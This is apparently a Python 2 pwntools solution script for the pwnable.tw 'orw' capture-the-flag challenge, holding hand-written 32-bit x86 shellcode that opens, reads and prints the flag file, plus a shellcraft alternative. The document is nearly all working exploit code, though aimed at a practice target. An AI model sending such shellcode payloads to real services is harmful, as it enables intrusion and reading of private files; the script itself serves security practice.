#!/usr/bin/python
#coding=utf-8
from PwnContext import *
from IPython import embed as ipy
context.terminal = ['gnome-terminal','-x','sh','-c']
s       = lambda data               :ctx.send(str(data))
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=False  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)

uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
def lg(s,addr):
    print '\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr)

context.log_level = 'debug'
ctx.binary = './orw'
ctx.remote = ('chall.pwnable.tw',10001)
# ctx.custom_lib_dir = './lib'
# ctx.debug_remote_libc = True
ctx.symbols = {}
ctx.breakpoints = [] 

rs('remote')
shellcode = '''
xor ecx,ecx 
xor edx,edx 
mov eax,0x5 
push 0x006761 
push 0x6c662f77 
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp
int 0x80

mov ebx,eax
mov eax,0x3
mov ecx,esp 
mov edx,0x26
int 0x80

mov eax,0x4
mov ebx,0x1
mov ecx,esp 
mov edx,0x26 
int 0x80
'''
#32位的程序不要使用syscall来系统调用
payload = asm(shellcraft.open("./flag"))
payload += asm(shellcraft.read(3,"esp",100))
payload += asm(shellcraft.write(1,"esp",100))
sla(':',asm(shellcode))
# libc = ctx.libc

irt()
